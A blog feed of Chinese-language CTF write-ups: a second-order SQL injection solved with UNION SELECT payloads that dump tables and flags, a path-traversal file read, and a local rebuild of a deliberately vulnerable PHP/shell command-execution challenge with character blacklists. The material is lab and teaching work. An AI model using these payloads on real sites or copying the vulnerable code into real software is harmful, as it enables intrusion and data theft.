txt">secret?secret=.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B3%C2%BB%C3%9C%C3%B5%C2%82%C2%A8%1Fw%C2%91%C2%89%C2%BB%C2%A3%C3%90E%08%C3%98%C2%BBR%C2%88-V%1B%C3%99%C2%96u%08%1E%0BZ%C3%A3%C3%AA%C2%8E%2Bs%C2%B8%2A%0D%06%C3%AE_%C3%974%C3%8C%C2%9D%C3%A9%2A%C3%B2%C3%AB%17V%C3%95%C3%96%22%C2%93c_G%06%C3%A5%C3%87%C3%A1%C2%A7%C3%AA%C3%8Fw%19%21a%5D%C3%90%15%C3%85%7B%1B%C2%A5%C3%84I5v%C2%AD%C3%BAi%C3%BE%C3%93%C2%A0%1F%04%C3%95Kx5%C3%B5%C2%BD%14%C3%8C%C3%B5%C3%88%3B%C3%BA%C2%BE%C2%96i%C3%92nB%C2%B0%C2%B5%C3%9C%C2%96%0A4%C2%8B%C3%AE%C2%AA%11%C2%A0%23%C2%8C%C2%A1%23_z<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240214222838942.png" alt="image-20240214222838942"></p><p>flag&#x3D;flag{b19033f8-6ffe-4933-8317-b425829587cc}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_October 2019 Twice SQL Injection</title>
    <link href="/2024/02/19/2024-02-18-October%202019%20Twice%20SQL%20Injection/"/>
    <url>/2024/02/19/2024-02-18-October%202019%20Twice%20SQL%20Injection/</url>
    
    <content type="html"><![CDATA[<h1 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p><a href="https://blog.csdn.net/AAAAAAAAAAAA66/article/details/122059073">buuctf XCTF October 2019 Twice SQL Injection 二次注入原理+题解_buuctf october 2019 twice sql injection-CSDN博客</a></p><h2 id="场景"><a href="#场景" class="headerlink" title="场景:"></a>场景:</h2><p><img src="/images/2024-2-18/image-20240216133954559.png" alt="image-20240216133954559"></p><p>一个登录页面，跟之前一样，先走一遍网页全部的业务逻辑，再来寻找存在的漏洞。</p><h3 id="注册一个账户"><a href="#注册一个账户" class="headerlink" title="注册一个账户:"></a>注册一个账户:</h3><p><img src="/2024/02/19/2024-02-18-October%202019%20Twice%20SQL%20Injection/Typora_images\image-20240216134117475-1708271061177-1.png" alt="image-20240216134117475"></p><h3 id="登录我们注册的账户"><a href="#登录我们注册的账户" class="headerlink" title="登录我们注册的账户:"></a>登录我们注册的账户:</h3><p><img src="/images/2024-2-18/image-20240216134717043.png" alt="image-20240216134717043"></p><h3 id="登录结果"><a href="#登录结果" class="headerlink" title="登录结果:"></a>登录结果:</h3><p><img src="/images/2024-2-18/image-20240216134732502.png" alt="image-20240216134732502"></p><h3 id="随便写一下info的内容"><a href="#随便写一下info的内容" class="headerlink" title="随便写一下info的内容:"></a>随便写一下info的内容:</h3><p><img src="/images/2024-2-18/image-20240216134808298.png" alt="image-20240216134808298"></p><h4 id="响应结果"><a href="#响应结果" class="headerlink" title="响应结果:"></a>响应结果:</h4><p><img src="/images/2024-2-18/image-20240216134829651.png" alt="image-20240216134829651"></p><p>我们写入的内容被重新回显到了网页上，这里可能存在mysql的二次注入漏洞，先将我们的数据插入到mysql中，然后再取出来回显到网页上。</p><h2 id="测试二次注入："><a href="#测试二次注入：" class="headerlink" title="测试二次注入："></a>测试二次注入：</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>info=0&#x27;and&#x27;1<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216135226796.png" alt="image-20240216135226796"></p><h4 id="响应结果-1"><a href="#响应结果-1" class="headerlink" title="响应结果:"></a>响应结果:</h4><p><img src="/images/2024-2-18/image-20240216135346507.png" alt="image-20240216135346507"></p><p>我们输入的字符串内容中的特殊字符被加入了\，这就导致我们普通的注入方式失效了，同时也可以确定，网页显示的Info的内容确实是从数据库中显示的，不然也不用担心我们使用单引号进行危险注入，直接前端显示就行了。</p><p>这里由于直接采用了\对特殊字符转义，所以就只能先放弃这个注入点了，根据网上的师傅的wp发现都是对用户名进行注入。</p><h2 id="通过用户名注入达到二次注入的目的"><a href="#通过用户名注入达到二次注入的目的" class="headerlink" title="通过用户名注入达到二次注入的目的:"></a>通过用户名注入达到二次注入的目的:</h2><h3 id="存在漏洞的sql语句"><a href="#存在漏洞的sql语句" class="headerlink" title="存在漏洞的sql语句:"></a>存在漏洞的sql语句:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=south1&#x27;union select DATABASE()#<br>select info from test2 where username = &#x27;south1&#x27;union select DATABASE()#&#x27; and password =123<br>没有对username进行过滤，直接拼接到sql中导致注入<br>当username=south1的记录不存在时，就只会回显database()的结果<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216143523665.png" alt="image-20240216143523665"></p><p><img src="/images/2024-2-18/image-20240216143548066.png" alt="image-20240216143548066"></p><p>所以将database()的值回显到info所在的网页位置上。</p><h3 id="注册"><a href="#注册" class="headerlink" title="注册:"></a>注册:</h3><h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=666&#x27;union select database()#<br>password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240219003025465.png" alt="image-20240219003025465"></p><p>该注册方式能够被成功注册，但是使用本地测试时，这是会导致报错的。</p><h4 id="本地测试注册"><a href="#本地测试注册" class="headerlink" title="本地测试注册:"></a>本地测试注册:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">insert into test2 (username,password) VALUES(&#x27;666&#x27;union select database()#&#x27;,&#x27;123&#x27;) <br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216143742997.png" alt="image-20240216143742997"></p><p>但是网页能成功注册，就说明在注册界面中，对用户输入的内容进行了’\‘的转义，才能让该内容被成功插入数据库。</p><h3 id="登录"><a href="#登录" class="headerlink" title="登录:"></a>登录:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=666&#x27;union select database()#<br>password=123<br></code></pre></td></tr></table></figure><h4 id="登录界面的sql语句猜测"><a href="#登录界面的sql语句猜测" class="headerlink" title="登录界面的sql语句猜测:"></a>登录界面的sql语句猜测:</h4><h5 id="sql1"><a href="#sql1" class="headerlink" title="sql1:"></a>sql1:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">select * from users where username=&#x27;&#x27; and password=&#x27;&#x27;<br>=&gt;<br>select * from users where username=&#x27;666&#x27;union select database()#&#x27; and password=&#x27;123&#x27;<br></code></pre></td></tr></table></figure><p>如果是该sql语句，那么select * from users where username&#x3D;’666’回显的所有字段的数量就和select database()回显的字段数不同，从而导致报错（666用户不存在时）：</p><p><img src="/images/2024-2-18/image-20240216144539591.png" alt="image-20240216144539591"></p><p>在理论上是会报错的无法运行的，但是当我们在登录界面输入我们的用户名和密码时，却成功登录并回显了database()的信息:</p><p><img src="/images/2024-2-18/image-20240216144705561.png" alt="image-20240216144705561"></p><h4 id="得到数据库信息为-ctftraining-说明在登录界面上的sql语句应该为"><a href="#得到数据库信息为-ctftraining-说明在登录界面上的sql语句应该为" class="headerlink" title="得到数据库信息为:ctftraining,说明在登录界面上的sql语句应该为:"></a>得到数据库信息为:ctftraining,说明在登录界面上的sql语句应该为:</h4><h5 id="sql2"><a href="#sql2" class="headerlink" title="sql2:"></a>sql2:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">select info from users where username=&#x27;&#x27; and password=&#x27;&#x27;<br>=&gt;<br>select info from users where username=&#x27;666&#x27;union select database()#&#x27; and password=&#x27;123&#x27;<br></code></pre></td></tr></table></figure><p>这样就可以使select info from users where username&#x3D;’666’搜索的字段数量和select database()所回显的字段数一致，又因为666这个用户不存在，所以最终回显的为database()的信息:</p><p><img src="/images/2024-2-18/image-20240216145111102.png" alt="image-20240216145111102"></p><p>即使666用户不存在，但是由于整个拼接的sql语句回显了记录，所以在网页的内部判断中认为该用户是存在的，所以就可以成功登录了，又因为回显的记录值只有database()的信息，所以登录后网页回显的内容为数据库信息，同时也验证了在登录界面没有对用户输入的内容进行’\‘转义的处理。</p><h3 id="假如666用户存在"><a href="#假如666用户存在" class="headerlink" title="假如666用户存在:"></a>假如666用户存在:</h3><h4 id="我们先注册一个666用户"><a href="#我们先注册一个666用户" class="headerlink" title="我们先注册一个666用户:"></a>我们先注册一个666用户:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=666<br>password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216145604894.png" alt="image-20240216145604894"></p><h4 id="登录-1"><a href="#登录-1" class="headerlink" title="登录:"></a>登录:</h4><p><img src="/images/2024-2-18/image-20240216145635144.png" alt="image-20240216145635144"></p><h5 id="index界面"><a href="#index界面" class="headerlink" title="index界面:"></a>index界面:</h5><p><img src="/images/2024-2-18/image-20240216145656828.png" alt="image-20240216145656828"></p><p>显示的内容为，正常用户登录后的结果，即默认显示的内容，默认可以是前端赋值，或者数据库默认存储再取出。</p><h4 id="我们再用我们的payload登录"><a href="#我们再用我们的payload登录" class="headerlink" title="我们再用我们的payload登录:"></a>我们再用我们的payload登录:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=666&#x27;union select database()#<br>password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216145914809.png" alt="image-20240216145914809"></p><h5 id="index界面-1"><a href="#index界面-1" class="headerlink" title="index界面:"></a>index界面:</h5><p><img src="/images/2024-2-18/image-20240216145952795.png" alt="image-20240216145952795"></p><p>发现是登录666用户时的正常index页面回显结果。</p><h4 id="使用本地测试"><a href="#使用本地测试" class="headerlink" title="使用本地测试:"></a>使用本地测试:</h4><p><img src="/images/2024-2-18/image-20240216150050452.png" alt="image-20240216150050452"></p><h5 id="sql1-1"><a href="#sql1-1" class="headerlink" title="sql1:"></a>sql1:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select info from test2 where username=&#x27;666&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216150145367.png" alt="image-20240216150145367"></p><p>正常的登录情况的返回结果，虽然info没有值，但是666存在所以依然可以返回结果集，前端可以判断结果集info的值来确定是不是null从而赋值默认值。</p><h5 id="sql2-1"><a href="#sql2-1" class="headerlink" title="sql2:"></a>sql2:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select info from test2 where username=&#x27;666&#x27;union select DATABASE()#&#x27; and password =123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216150355179.png" alt="image-20240216150355179"></p><p>这是我们进行恶意登录的情况，这次是由于666用户存在，所以第一条记录为null，不像之前666不存在时，直接第一条记录就是database(),前端依然可以通过只判断第一条记录是不是为null来决定是否赋值默认内容。</p><p>这也就是为什么我们注册666用户后，再用恶意payload登录时，回显的却是正常的用户登录结果。</p><p><strong>明确了网页的漏洞后，我们就可以进行攻击了，本质就是常规的union注入配合二次注入</strong></p><h3 id="获取数据库表的信息"><a href="#获取数据库表的信息" class="headerlink" title="获取数据库表的信息:"></a>获取数据库表的信息:</h3><h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=xxx&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27; #<br>password=123<br><br>这里的xxx一定要是不存在的用户<br></code></pre></td></tr></table></figure><h4 id="注册-1"><a href="#注册-1" class="headerlink" title="注册:"></a>注册:</h4><p><img src="/images/2024-2-18/image-20240216151020825.png" alt="image-20240216151020825"></p><h4 id="登录-2"><a href="#登录-2" class="headerlink" title="登录:"></a>登录:</h4><p><img src="/images/2024-2-18/image-20240216151214545.png" alt="image-20240216151214545"></p><h4 id="index界面-2"><a href="#index界面-2" class="headerlink" title="index界面:"></a>index界面:</h4><p><img src="/images/2024-2-18/image-20240216151228908.png" alt="image-20240216151228908"></p><p>发现flag表</p><h3 id="爆表的字段名"><a href="#爆表的字段名" class="headerlink" title="爆表的字段名:"></a>爆表的字段名:</h3><h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=xxx&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;#<br>password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216151405598.png" alt="image-20240216151405598"></p><p>得到字段名为flag</p><h3 id="爆字段信息"><a href="#爆字段信息" class="headerlink" title="爆字段信息:"></a>爆字段信息:</h3><h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=xxx&#x27; union select group_concat(flag) from flag#<br>password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216151539104.png" alt="image-20240216151539104"></p><p>flag&#x3D;flag{47be8e14-bae6-4158-9c41-f92df44c27b2}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[网鼎杯 2020 半决赛]AliceWebsite</title>
    <link href="/2024/02/18/2024-02-18-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E5%8D%8A%E5%86%B3%E8%B5%9B%5DAliceWebsite/"/>
    <url>/2024/02/18/2024-02-18-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E5%8D%8A%E5%86%B3%E8%B5%9B%5DAliceWebsite/</url>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-半决赛-AliceWebsite"><a href="#网鼎杯-2020-半决赛-AliceWebsite" class="headerlink" title="[网鼎杯 2020 半决赛]AliceWebsite"></a>[网鼎杯 2020 半决赛]AliceWebsite</h1><h2 id="场景"><a href="#场景" class="headerlink" title="场景:"></a>场景:</h2><h3 id="Home界面"><a href="#Home界面" class="headerlink" title="Home界面:"></a>Home界面:</h3><p><img src="/images/2024-2-18/image-20240216155840649.png" alt="image-20240216155840649"></p><p>先走一遍网页的业务逻辑，对菜单栏的内容都访问一下:</p><h3 id="About界面"><a href="#About界面" class="headerlink" title="About界面:"></a>About界面:</h3><p><img src="/images/2024-2-18/image-20240216160155361.png" alt="image-20240216160155361"></p><h3 id="访问robots-txt"><a href="#访问robots-txt" class="headerlink" title="访问robots.txt:"></a>访问robots.txt:</h3><p><img src="/images/2024-2-18/image-20240216160245044.png" alt="image-20240216160245044"></p><p>没有太多有用信息</p><h2 id="查看网页源代码"><a href="#查看网页源代码" class="headerlink" title="查看网页源代码:"></a>查看网页源代码:</h2><p><img src="/images/2024-2-18/image-20240216160321154.png" alt="image-20240216160321154"></p><p>发现有一个参数action,后面的值都是文件名，猜测该参数可以进行任意文件读取</p><h2 id="使用action参数读取flag文件"><a href="#使用action参数读取flag文件" class="headerlink" title="使用action参数读取flag文件:"></a>使用action参数读取flag文件:</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">index.php?action=../../../../../../../../flag<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216160512278.png" alt="image-20240216160512278"></p><p>flag&#x3D;flag{6749e126-c3e8-4d36-89ca-3e4a0c801992}    </p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因:"></a>漏洞成因:</h2><p><img src="/images/2024-2-18/image-20240216160823788.png" alt="image-20240216160823788"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">index.php中的include会将存在的文件拼接到代码上，而无法编译的文件内容就会直接显示出来，从而造成任意文件读取。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_第二届N1CTF Junior_zako复现</title>
    <link href="/2024/02/18/2024-02-18-%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF%20Junior_zako%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/02/18/2024-02-18-%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF%20Junior_zako%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="第二届N1CTF-Junior-zako复现"><a href="#第二届N1CTF-Junior-zako复现" class="headerlink" title="第二届N1CTF Junior_zako复现"></a>第二届N1CTF Junior_zako复现</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><h3 id="wp参考"><a href="#wp参考" class="headerlink" title="wp参考:"></a>wp参考:</h3><h4 id="题目wp"><a href="#题目wp" class="headerlink" title="题目wp:"></a>题目wp:</h4><p><a href="https://blog.csdn.net/Zhiyilang/article/details/136054665">N1CTF Junior 2024 Web Official Writeup（Nu1L Team组织的官方纳新赛事，旨在选拔优秀人才加入Nu1L Team，可是小北是大二生，抱着玩玩的心态来的）_n1ctf junion-CSDN博客</a></p><p><a href="https://c1oudfl0w0.github.io/blog/2024/02/03/%E7%AC%AC%E4%BA%8C%E5%B1%8A-N1CTF-Junior/#zako">第二届 N1CTF Junior | 雲流のLowest World (c1oudfl0w0.github.io)</a></p><h4 id="php非法传参"><a href="#php非法传参" class="headerlink" title="php非法传参:"></a>php非法传参:</h4><p><a href="https://blog.csdn.net/mochu7777777/article/details/115050295">谈一谈PHP中关于非法参数名传参问题_arr4y非法传参-CSDN博客</a></p><h3 id="环境参考"><a href="#环境参考" class="headerlink" title="环境参考:"></a>环境参考:</h3><p><a href="https://blog.csdn.net/a_piece_of_ppx/article/details/124929728">【Linux中shell命令】.sh文件种种操作-CSDN博客</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建:"></a>环境搭建:</h2><h3 id="创建index-php"><a href="#创建index-php" class="headerlink" title="创建index.php:"></a>创建index.php:</h3><p><img src="/images/2024-2-18/image-20240211230203947.png" alt="image-20240211230203947"></p><h4 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-comment">//something hide here</span><br><span class="hljs-title function_ invoke__">highlight_string</span>(<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-keyword">__FILE__</span>.<span class="hljs-string">&quot; | grep -v preg_match | grep -v highlight&quot;</span>));<br> <br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;__secret.xswl.io&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>)&gt;<span class="hljs-number">70</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no, &gt;70&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/(&#x27;|`|\n|\t|\\\$|~|@|#|;|&amp;|\\||-|_|\\=|\\*|!|\\%|\\\^|index|execute&#x27;)/is&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你就不能绕一下喵&quot;</span>);<br>&#125;<br> <br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;./execute.sh &#x27;&quot;</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>);<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="创建execute-sh："><a href="#创建execute-sh：" class="headerlink" title="创建execute.sh："></a>创建execute.sh：</h3><p><img src="/images/2024-2-18/image-20240211230134948.png" alt="image-20240211230134948"></p><h4 id="源码-1"><a href="#源码-1" class="headerlink" title="源码:"></a>源码:</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br> <br><span class="hljs-function"><span class="hljs-title">reject</span></span>() &#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;1&#125;</span>&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br>&#125;<br> <br>XXXCMD=<span class="hljs-variable">$1</span><br> <br>awk -v str=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;XXXCMD&#125;</span>&quot;</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">BEGIN &#123;</span><br><span class="hljs-string">    deny=&quot;`;&amp;$()&#123;&#125;[]!@#$%^&amp;*-&quot;;</span><br><span class="hljs-string">    for (i = 1; i &lt;= length(str); i++) &#123;</span><br><span class="hljs-string">        char = substr(str, i, 1);</span><br><span class="hljs-string">        for (x = 1; x &lt; length(deny) + 1; x++) &#123;</span><br><span class="hljs-string">            r = substr(deny, x, 1);</span><br><span class="hljs-string">            if (char == r) exit 1;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#x27;</span><br> <br>[ $? -ne 0 ] &amp;&amp; reject <span class="hljs-string">&quot;NOT ALLOW 1&quot;</span><br> <br>eval_cmd=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;XXXCMD&#125;</span>&quot;</span> | awk -F <span class="hljs-string">&quot;|&quot;</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">BEGIN &#123;</span><br><span class="hljs-string">    allows[1] = &quot;ls&quot;;</span><br><span class="hljs-string">    allows[2] = &quot;makabaka&quot;;</span><br><span class="hljs-string">    allows[3] = &quot;whoareu&quot;;</span><br><span class="hljs-string">    allows[4] = &quot;cut~no&quot;;</span><br><span class="hljs-string">    allows[5] = &quot;grep&quot;;</span><br><span class="hljs-string">    allows[6] = &quot;wc&quot;;</span><br><span class="hljs-string">    allows[7] = &quot;杂鱼杂鱼&quot;;</span><br><span class="hljs-string">    allows[8] = &quot;netstat.jpg&quot;;</span><br><span class="hljs-string">    allows[9] = &quot;awsl&quot;;</span><br><span class="hljs-string">    allows[10] = &quot;dmesg&quot;;</span><br><span class="hljs-string">    allows[11] = &quot;xswl&quot;;</span><br><span class="hljs-string">&#125;&#123;</span><br><span class="hljs-string">    num = 1;</span><br><span class="hljs-string">    for (i = 1; i &lt;= NF; i++) &#123;</span><br><span class="hljs-string">        for (x = 1; x &lt;= length(allows); x++) &#123;</span><br><span class="hljs-string">            cmpstr = substr($i, 1, length(allows[x]));</span><br><span class="hljs-string">            if (cmpstr == allows[x])</span><br><span class="hljs-string">                eval_cmd[num++] = $i;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">END &#123;</span><br><span class="hljs-string">    for (i = 1; i &lt;= length(eval_cmd); i++) &#123;</span><br><span class="hljs-string">        if (i != 1)</span><br><span class="hljs-string">            printf &quot;| %s&quot;, eval_cmd[i];</span><br><span class="hljs-string">        else</span><br><span class="hljs-string">            printf &quot;%s&quot;, eval_cmd[i];</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;&#x27;</span><br>)<br> <br>[ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;XXXCMD&#125;</span>&quot;</span> = <span class="hljs-string">&quot;&quot;</span> ] &amp;&amp; reject <span class="hljs-string">&quot;NOT ALLOW 2&quot;</span><br> <br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$&#123;eval_cmd&#125;</span><br></code></pre></td></tr></table></figure><h3 id="赋予所有用户对zako文件夹的所有权限"><a href="#赋予所有用户对zako文件夹的所有权限" class="headerlink" title="赋予所有用户对zako文件夹的所有权限:"></a>赋予所有用户对zako文件夹的所有权限:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">chmod -R 777 /www/admin/TestForWeb/zako<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212015024040.png" alt="image-20240212015024040"></p><h3 id="对execute-sh设置运行权限"><a href="#对execute-sh设置运行权限" class="headerlink" title="对execute.sh设置运行权限:"></a>对execute.sh设置运行权限:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">chmod +x ./execute.sh #使脚本具有执行权限<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240211230549528.png" alt="image-20240211230549528"></p><p>可以进行运行！！！</p><h3 id="创建flag文件在上一级文件夹中"><a href="#创建flag文件在上一级文件夹中" class="headerlink" title="创建flag文件在上一级文件夹中:"></a>创建flag文件在上一级文件夹中:</h3><h4 id="readflag"><a href="#readflag" class="headerlink" title="readflag:"></a>readflag:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">south&#123;y0u_a3e_w1l1!!!&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240211231441817.png" alt="image-20240211231441817"></p><h3 id="访问我们的环境"><a href="#访问我们的环境" class="headerlink" title="访问我们的环境:"></a>访问我们的环境:</h3><p><img src="/images/2024-2-18/image-20240211231515563.png" alt="image-20240211231515563"></p><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境:"></a>测试环境:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">php非法传参，将_变为[,<br>?_[secret.xswl.io=ls<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240211231710088.png" alt="image-20240211231710088"></p><p>我们的环境搭建成功！！！</p><h2 id="zako复现"><a href="#zako复现" class="headerlink" 